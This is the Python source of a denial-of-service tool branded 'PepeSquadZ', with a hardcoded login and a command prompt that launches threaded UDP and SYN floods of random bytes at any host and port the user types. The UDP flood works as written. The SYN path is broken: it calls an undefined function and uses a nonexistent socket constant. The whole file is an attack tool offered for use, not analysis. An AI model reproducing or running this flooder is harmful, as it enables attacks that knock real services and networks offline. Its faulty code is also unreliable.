#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

method = """\033[32m    
╔════════════════════|\033[00mPepe Methods\033[32m|════════════════════╗ 
║ \033[00mUDP  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[32m|\033[00m UDP ATTACK\033[32m    ║
║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[32m|\033[00m SYN ATTACK\033[32m    ║
╚══════════════════════════════════════════════════════╝\033[00m
"""
version = "1.0"
help = """
\033[32m
╔═══════════════════════════════╗
║\033[00mMethods \033[32m|\033[00m Shows the methods\033[32m    ║
║\033[00mstopattacks \033[32m|\033[00mTo Stop Attack\033[32m    ║
║\033[00mClear   \033[32m|\033[00m Clears Screen\033[32m        ║
║\033[00mExit    \033[32m|\033[00m Closes The Script\033[32m    ║
╚═══════════════════════════════╝
"""

banner = """\033[32m
  ╔════════════════════════════════════════════════════════════════════════╗
  ║        \033[00m[>]Welcome To PepeSquadZ Best Free Perl On The Market[<]\033[32m        ║
  ╚════════════════════════════════════════════════════════════════════════╝
"""

altbanner = """\033[32m
  ╔════════════════════════════════════════════════════════════════════════╗
  ║        \033[00m[>]Welcome To PepeSquadZ Best Free Perl On The Market[<]\033[32m        ║
  ╚════════════════════════════════════════════════════════════════════════╝
"""

Login = """\033[32m
  ╔════════════════════════════════════════════════════════════════════════╗
  ║       \033[00m[>]Login Here By Using [Pepe] as username and password[<]\033[32m        ║
  ╚════════════════════════════════════════════════════════════════════════╝
"""

cookie = open(".PepeSquadZ_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
udp = True
syn = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1


def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn


	while True:
		sys.stdout.write("\x1b]2;PepeSquadZ\x07")
		Pepe = input("\033[1;00m[\033[32mPepeSquadZ\033[1;00m]-\033[32m>\033[00m ").lower()
		Pepeput = Pepe.split(" ")[0]
		if Pepeput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif Pepeput == "help":
			print (help)
			main()
		elif Pepeput == "":
			main()
		elif Pepeput == "exit":
			exit()
		elif Pepeput == "version":
			print ("PepeSquadZ version: "+version+" ")
		elif Pepeput == "methods":
			print (method)
			main()
		elif Pepeput == "udp":
			if username == "":
				print ("[\033[32mPepeSquadZ\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					Pepeput, host, port, timer, pack = Pepe.split(" ")
					socket.gethostbyname(host)
					print ("[\033[32mPepe has successfully sent a attack to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[32mPepeSquadZ\033[00m] The command {} requires an argument".format (Pepeput))
					main()
				except socket.gaierror:
					print ("[\033[32mPepeSquadZ\033[00m] Host: {} invalid".format (host))
					main()

		elif Pepeput == "syn":
			try:
				Pepeput, host, port, timer, pack = Pepe.split(" ")
				socket.gethostbyname(host)
				print ("\033[37mPepe has successfully sent a attack to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[32mPepeSquadZ\033[00m] The command {} requires an argument".format (Pepeput))
				main()
			except socket.gaierror:
				print ("[\033[32mPepeSquadZ\033[00m] Host: {} invalid".format (host))
				main()
		elif Pepeput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif Pepeput == "stop":
			what = Pepe.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[32mPepeSquadZ\033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[32mPepeSquadZ\033[00m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[32mPepeSquadZ\033[00m] {} Not a command".format(Pepeput))
			main()


try:
	users = ["Pepe"]
	clear = "clear"
	os.system (clear)
	print (Login)

	username = getpass.getpass ("\033[37m[>] Username: ")
	if username in users:
		user = username
	else:
		print ("\033[91m[>] Wrong Username Type Pepe\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["Pepe"]
	password = getpass.getpass ("\033[37m[>] Password: ")
	if user == "Pepe":
		if password == passwords[0]:
			print ("\033[32m[>] You Have Now Logged Into PepePerl")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mPepe\033[00m] Now Closing\n")
				main()
		else:
			print ("\033[91m[>] Wrong Password Type Pepe.\n")
			exit()
except KeyboardInterrupt:
	exit()
